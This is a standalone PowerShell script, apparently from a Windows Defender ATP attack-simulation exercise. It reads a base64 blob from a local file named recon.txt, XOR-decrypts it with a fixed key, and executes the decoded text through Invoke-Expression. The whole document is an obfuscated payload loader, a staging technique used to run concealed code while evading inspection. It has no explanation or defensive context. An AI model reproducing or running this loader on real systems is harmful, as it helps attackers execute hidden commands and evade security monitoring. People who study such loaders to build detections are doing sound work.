[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
$xor = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');
$base64String = (Get-Content -Path "C:\Files\recon.txt");
Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) }
$i = 0;
$decryptedBytes = @();
$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
    $i++; 
    if ($i -eq $xor.Length) {
        $i = 0
    }
}
Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
